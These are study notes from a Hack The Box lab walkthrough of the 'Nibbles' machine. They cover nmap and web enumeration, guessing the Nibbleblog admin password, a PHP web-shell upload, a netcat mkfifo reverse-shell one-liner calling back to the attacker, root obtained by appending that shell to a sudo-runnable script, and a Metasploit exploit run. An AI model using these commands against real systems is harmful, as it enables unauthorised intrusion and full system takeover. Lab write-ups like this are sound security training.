# ==Attacking Your First Box - Nibbles #activity==
## ==Enumeration==

### Nmap
```
┌──(kali㉿kali)-[~]
└─$ nmap 10.129.163.93 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-01 18:32 EDT
Nmap scan report for 10.129.163.93
Host is up (0.050s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 1.02 seconds
```

```
┌──(kali㉿kali)-[~]
└─$ nmap -p 22,80 -sC -sV 10.129.163.93
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-01 18:32 EDT
Nmap scan report for 10.129.163.93
Host is up (0.046s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.44 seconds

```
*useful nmap tags* #technique
-sV 
	**service enumeration**
--open
	**open ports**
-oA
	**output all scans to XML output, g reppable output, and text output**
nmap -v -oG-
	***to view which ports nmap scans for***
-p-
	**all ports**
-sC
	default scripts


***ITS ESSENTIAL TO GET THE HABIT OF TAKING EXTENSIVE NOTES AND SAVING ALL CONSOLE OUTPUT EARLY ON***
	**TIME STAMPS**

#### Using Nmap -oA-
```shell-session
mricognito@htb[/htb]$ nmap -sV --open -oA nibbles_initial_scan 10.129.42.190
```

```shell-session
mricognito@htb[/htb]$ ls

nibbles_initial_scan.gnmap  nibbles_initial_scan.nmap  nibbles_initial_scan.xml
```

#### Confirming Nmap scan with nc banner grabbing
```shell-session
mricognito@htb[/htb]$ nc -nv 10.129.42.190 22

(UNKNOWN) [10.129.42.190] 22 (ssh) open
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8
```

```shell-session
mricognito@htb[/htb]$ nc -nv 10.129.42.190 80

(UNKNOWN) [10.129.42.190] 80 (http) open
```
The `-n` option disables the use of DNS resolution, meaning Netcat will only use IP addresses and not domain names. 
The `-v` option enables verbose mode, which prints additional information about the connection.

#### Specifying specific scripts in Nmap #Important #technique #tool
```shell-session
mricognito@htb[/htb]$ nmap -sV --script=http-enum -oA nibbles_nmap_http_enum 10.129.42.190 

Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-16 23:41 EST
Nmap scan report for 10.129.42.190
Host is up (0.11s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd <REDACTED> ((Ubuntu))
|_http-server-header: Apache/<REDACTED> (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

***THE LINK FOR ALL NMAP SCRIPTS*** #Important 
https://nmap.org/nsedoc/scripts/

## ==Web Footprinting==
### Whatweb #tool 

*we can use `whatweb` to try and identify the web application being used*
```shell-session
mricognito@htb[/htb]$ whatweb 10.129.42.190

http://10.129.42.190 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.42.190]
```
	*nothing was specified*

Going to the target in Firefox shows "Hello World!"
![[Pasted image 20250602100411.png]]
The page source reveals an interesting comment
![[Pasted image 20250602100442.png]]
I also can check the page source with cURL
```shell-session
mricognito@htb[/htb]$ curl http://10.129.42.190

<b>Hello world!</b>

<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

*going to run `whatweb` now on the new directory*
```shell-session
mricognito@htb[/htb]$ whatweb http://10.129.42.190/nibbleblog

http://10.129.42.190/nibbleblog [301 Moved Permanently] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.42.190], RedirectLocation[http://10.129.42.190/nibbleblog/], Title[301 Moved Permanently]
http://10.129.42.190/nibbleblog/ [200 OK] Apache[2.4.18], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.42.190], JQuery, MetaGenerator[Nibbleblog], PoweredBy[Nibbleblog], Script, Title[Nibbles - Yum yum]
```

*The **following*** *technologies are in use*:
HTML5
jQuery
PHP
Nibbleblog (blogging engine)

### Searching for exploit with information
searching for Nibbleblog exploit on Google
gives this file upload vulnerability
https://www.rapid7.com/db/modules/exploit/multi/http/nibbleblog_file_upload/

the article shows a metasploit module for this exploit:
![[Pasted image 20250602102055.png]]
	`the metasploit module works on version 4.0.3`
	`the metasploit module is utilizing the /admin.php portal`

### Using FFUF to check for pages/directories
```
ffuf -u http://10.129.42.190/nibbleblog/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

```shell-session
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/admin (Status: 301)
/admin.php (Status: 200)
/content (Status: 301)
/index.php (Status: 200)
/languages (Status: 301)
/plugins (Status: 301)
/README (Status: 200)
/themes (Status: 301)
```

`200: Pages/directories that are directly accessible
`403: indicate that access to these resources is forbidden`
`301: Permanent redirect`
### Using these to get more information
```shell-session
mricognito@htb[/htb]$ curl http://10.129.42.190/nibbleblog/README

====== Nibbleblog ======
Version: v4.0.3
Codename: Coffee
Release date: 2014-04-01

Site: http://www.nibbleblog.com
Blog: http://blog.nibbleblog.com
Help & Support: http://forum.nibbleblog.com
Documentation: http://docs.nibbleblog.com

===== Social =====

* Twitter: http://twitter.com/nibbleblog
* Facebook: http://www.facebook.com/nibbleblog
* Google+: http://google.com/+nibbleblog

===== System Requirements =====

* PHP v5.2 or higher
* PHP module - DOM
* PHP module - SimpleXML
* PHP module - GD
* Directory “content” writable by Apache/PHP

<SNIP>
```
WE now can confirm that 4.0.3 is in use, making it likely that the Metasploit module will work
	HOWEVER, we need admin credentials for the exploit mentioned, so let's poke around for more information

*Browsing to nibbleblog/content there are subdirectories:*
Public
Private
tmp

*Within nibbleblog/content/private* there is a users.xml file
```shell-session
mricognito@htb[/htb]$ curl -s http://10.129.42.190/nibbleblog/content/private/users.xml | xmllint  --format -

<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<users>
  <user username="admin">
    <id type="integer">0</id>
    <session_fail_count type="integer">2</session_fail_count>
    <session_date type="integer">1608182184</session_date>
  </user>
  <blacklist type="string" ip="10.10.10.1">
    <date type="integer">1512964659</date>
    <fail_count type="integer">1</fail_count>
  </blacklist>
  <blacklist type="string" ip="10.10.14.2">
    <date type="integer">1608182171</date>
    <fail_count type="integer">5</fail_count>
  </blacklist>
</users>
```
	confirms the **admin** username, no passsword yet

Up to this point we have the following information:
	1. Nibbleblog is vulnerable to a file upload vulnerability
	2. We have an admin portal
	3. Users.xml confirmed there is a valid **admin** username
	4. We cannot brute force because too many invalid login attempts blacklists our IP

Inside of /nibbleblog/content/private/ there is a config.xml file
```shell-session
ricognito@htb[/htb]$ curl -s http://10.129.42.190/nibbleblog/content/private/config.xml | xmllint --format -

<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<config>
  <name type="string">Nibbles</name>
  <slogan type="string">Yum yum</slogan>
  <footer type="string">Powered by Nibbleblog</footer>
  <advanced_post_options type="integer">0</advanced_post_options>
  <url type="string">http://10.129.42.190/nibbleblog/</url>
  <path type="string">/nibbleblog/</path>
  <items_rss type="integer">4</items_rss>
  <items_page type="integer">6</items_page>
  <language type="string">en_US</language>
  <timezone type="string">UTC</timezone>
  <timestamp_format type="string">%d %B, %Y</timestamp_format>
  <locale type="string">en_US</locale>
  <img_resize type="integer">1</img_resize>
  <img_resize_width type="integer">1000</img_resize_width>
  <img_resize_height type="integer">600</img_resize_height>
  <img_resize_quality type="integer">100</img_resize_quality>
  <img_resize_option type="string">auto</img_resize_option>
  <img_thumbnail type="integer">1</img_thumbnail>
  <img_thumbnail_width type="integer">190</img_thumbnail_width>
  <img_thumbnail_height type="integer">190</img_thumbnail_height>
  <img_thumbnail_quality type="integer">100</img_thumbnail_quality>
  <img_thumbnail_option type="string">landscape</img_thumbnail_option>
  <theme type="string">simpler</theme>
  <notification_comments type="integer">1</notification_comments>
  <notification_session_fail type="integer">0</notification_session_fail>
  <notification_session_start type="integer">0</notification_session_start>
  <notification_email_to type="string">admin@nibbles.com</notification_email_to>
  <notification_email_from type="string">noreply@10.10.10.134</notification_email_from>
  <seo_site_title type="string">Nibbles - Yum yum</seo_site_title>
  <seo_site_description type="string"/>
  <seo_keywords type="string"/>
  <seo_robots type="string"/>
  <seo_google_code type="string"/>
  <seo_bing_code type="string"/>
  <seo_author type="string"/>
  <friendly_urls type="integer">0</friendly_urls>
  <default_homepage type="integer">0</default_homepage>
</config>
```
	No explicit 'passsword' but we see the word 'nibbles' mentioned twice and within the notification e-mail address. It's also the name of the box.

*Trying "admin" and "nibbles" gives us a successful login*
	read below for a common password cracking method
#### Crawling a website with CeWL for Custom Word List Generator #tool #technique
https://github.com/digininja/CeWL
CeWL is a Ruby tool that spiders a website to a set depth, collects unique words, and creates a custom word list for password cracking (e.g., with John the Ripper). It defaults to the target site, a depth of 2, and outputs words of 3+ characters. Options allow deeper searches, offsite crawling, and file output. FAB, a related tool, extracts= extracts metadata for author lists from downloaded files. Ruby 2.7 may show warnings, but they don’t affect CeWL’s functionality.

### Recap Up To This Point
This shows us how crucial thorough enumeration is. Let us recap what we have found so far:

- We started with a simple `nmap` scan showing two open ports
- Discovered an instance of `Nibbleblog`
- Analyzed the technologies in use using `whatweb`
- Found the admin login portal page at `admin.php`
- Discovered that directory listing is enabled and browsed several directories
- Confirmed that `admin` was the valid username
- Found out the hard way that IP blacklisting is enabled to prevent brute-force login attempts
- Uncovered clues that led us to a valid admin password of nibbles

## ==Initial Foothold==
Using "Admin" and "nibbles" we can log into the admin portal.

We know that the metasploit module will likely work for RCE, however let's enumerate the admin portal for other avenues of attack.

There are the following pages within the portal:

| **Page**   | **Contents**                                                                                                                                                           |
| ---------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Publish`  | making a new post, video post, quote post, or new page. It could be interesting.                                                                                       |
| `Comments` | shows no published comments                                                                                                                                            |
| `Manage`   | Allows us to manage posts, pages, and categories. We can edit and delete categories, not overly interesting.                                                           |
| `Settings` | Scrolling to the bottom confirms that the vulnerable version 4.0.3 is in use. Several settings are available, but none seem valuable to us.                            |
| `Themes`   | This Allows us to install a new theme from a pre-selected list.                                                                                                        |
| `Plugins`  | Allows us to configure, install, or uninstall plugins. The `My image` plugin allows us to upload an image file. Could this be abused to upload `PHP` code potentially? |
`unable to make a new page`

Within **Plugins** / my_image there is the options to upload an image.

Creating a php file to test for code execution with the following snippet:
`<?php system('id'); ?>`
	save and upload

testing to see if the file was uploaded to the previously found **/content** directory: 
```shell-session
mricognito@htb[/htb]$ curl http://10.129.42.190/nibbleblog/content/private/plugins/my_image/image.php

uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```
it seems as though it has worked, next lets create a reverse shell with php and repeat
	lets use [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) to find a Bash reverse shell one-liner and add it into the php file:
```shell-session
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKING IP> <LISTENING PORT) >/tmp/f
```

add the VPN address into the `<ATTACKING IP>` and the corresponding port into `<LISTENING PORT>`

Start a listening port on the attacking machine with the following command:

```shell session
nc -lvnp 9443
```
Finally to execute the reverse shell lets call the php file by cURLing:
```shell session
http://nibbleblog/content/private/plugins/my_image/image.php
```
This results in the following on our attacking machine:
```shell-session
mricognito@htb[/htb]$ nc -lvnp 9443

listening on [any] 9443 ...
connect to [10.10.14.2] from (UNKNOWN) [10.129.42.190] 40106
/bin/sh: 0: can't access tty; job control turned off
$ id

uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```

*upgrading the reverse shell to a 'nicer' shell, this is because the shell we have is not a fully interactive TTY*
	*this means we can't do commands such as su, text editors, and tab-completion*
	we can use this post:
	https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
	or we can use the Python one-liner to spawn a psuedo-terminal
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```shell session
nibbler@Nibbles:/var/www/html$ cd ~
cd ~
nibbler@Nibbles:/home/nibbler$ ls
ls
personal.zip  user.txt
```

## ==Privilege Escalation==

### Unzipping Personal.zip
Within the home directory of nibbler we find a `personal.zip`
```shell-session
nibbler@Nibbles:/home/nibbler$ unzip personal.zip

unzip personal.zip
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh 
```
monitor.sh is a monitoring script owned by our nibbler user and it is writeable
	putting this aside for now

since we have access to the server we can pull in LinEnum.sh to automate the privilege escalation checks

### Pulling LinEnum.sh onto target
1. Download LinEnum.sh onto attacker machine
2. Launch a python http server
	1. ```sudo python3 -m http.server 8080```
3. Download LinEnum.sh onto target machine
	1. `wget http://10.10.15.3:8080/LinEnum.sh`
	2. `10.129.155.196 - - [03/Jun/2025 17:03:57] "GET /LinEnum.sh HTTP/1.1" 200 -`

### Appending a reverse shell to monitor.sh
We can't run LinEnum because that would require the sudo password for root

After checking `sudo -l` we are able to run monitor.sh with the sudo command
	appending a reverse shell will open a reverse shell with root

**Appending Reverse Shell One-Liner** #technique
```shell-session
nibbler@Nibbles:/home/nibbler/personal/stuff$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.3 9442 >/tmp/f' | tee -a monitor.sh
```

### Using monitor.sh for root shell
==***IMPORTANT***== #Important
*It is **crucial** if we ever encounter a situation where we can leverage a **writeable** **file** for privilege escalation. We only **append** to the **end** of the file (**after** making a **backup** copy of the file) to avoid overwriting it and causing a disruption*
****
*set up a nc listener*
`nc -lvnp 9442`

*then we just run the script with sudo*
`sudo ./monitor.sh`

*now on our nc listener we see we achieved a root shell*
```
listening on [any] 9442 ...
connect to [10.10.15.3] from (UNKNOWN) [10.129.155.196] 44410
# id
uid=0(root) gid=0(root) groups=0(root)
```

*let's grab the root flag*
```
# cd /root
ls
# root.txt
# cat root.txt
de5e5d6619862a8aa5b9b212314e0cdd
```

## Alternative User Method - Metasploit

- As discussed earlier, there is a metasploit module that works for this box
- It is much more straightforward, it is worth practicing both  methods to become familiar with as many tools and techniques as possible

**Start msfconsole**
```
┌──(kali㉿kali)-[~/Desktop/temp/privesc]
└─$ msfconsole
Metasploit tip: You can upgrade a shell to a Meterpreter session on many 
platforms using sessions -u <session_id>
                                                  

      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
  oOOOOOOOO.MMMM.oOOOOoOOOOl.MMMM,OOOOOOOOo
  dOOOOOOOO.MMMMMM.cOOOOOc.MMMMMM,OOOOOOOOx
  lOOOOOOOO.MMMMMMMMM;d;MMMMMMMMM,OOOOOOOOl
  .OOOOOOOO.MMM.;MMMMMMMMMMM;MMMM,OOOOOOOO.
   cOOOOOOO.MMM.OOc.MMMMM'oOO.MMM,OOOOOOOc
    oOOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOOo
     lOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOl
      ;OOOO'MMM.OOOO.MMM:OOOO.MMM;OOOO;
       .dOOo'WM.OOOOocccxOOOO.MX'xOOd.
         ,kOl'M.OOOOOOOOOOOOO.M'dOk,
           :kk;.OOOOOOOOOOOOO.;Ok:
             ;kOOOOOOOOOOOOOOOk:
               ,xOOOOOOOOOOOx,
                 .lOOOOOOOl.
                    ,dOd,
                      .

       =[ metasploit v6.4.50-dev                          ]
+ -- --=[ 2495 exploits - 1283 auxiliary - 393 post       ]
+ -- --=[ 1607 payloads - 49 encoders - 13 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/
```

**search nibbleblog and view required options**
```
msf6 > search nibbleblog

Matching Modules
================

   #  Name                                       Disclosure Date  Rank       Check  Description
   -  ----                                       ---------------  ----       -----  -----------
   0  exploit/multi/http/nibbleblog_file_upload  2015-09-01       excellent  Yes    Nibbleblog File Upload Vulnerability


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/nibbleblog_file_upload

msf6 > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(multi/http/nibbleblog_file_upload) > show options

Module options (exploit/multi/http/nibbleblog_file_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       The password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the web application
   USERNAME                    yes       The username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.40.135   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Nibbleblog 4.0.3



View the full module info with the info, or info -d command.

```

**Setting Options**
```
msf6 exploit(multi/http/nibbleblog_file_upload) > set PASSWORD nibbles
PASSWORD => nibbler
msf6 exploit(multi/http/nibbleblog_file_upload) > set RHOSTS 10.129.155.196
RHOSTS => 10.129.155.196
msf6 exploit(multi/http/nibbleblog_file_upload) > set RPORT 80
RPORT => 80
msf6 exploit(multi/http/nibbleblog_file_upload) > set TARGETURI nibbleblog
TARGETURI => nibbleblog
msf6 exploit(multi/http/nibbleblog_file_upload) > set USERNAME admin
USERNAME => admin
msf6 exploit(multi/http/nibbleblog_file_upload) > 
```

 **Running Exploit**
 ```
shell-session
msf6 exploit(multi/http/nibbleblog_file_upload) > exploit

[*] Started reverse TCP handler on 10.10.15.3:4444 
[*] Command shell session 4 opened (10.10.15.3:4444 -> 10.129.42.190:53642) at 2021-04-21 16:32:37 +0000
[+] Deleted image.php

id
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```
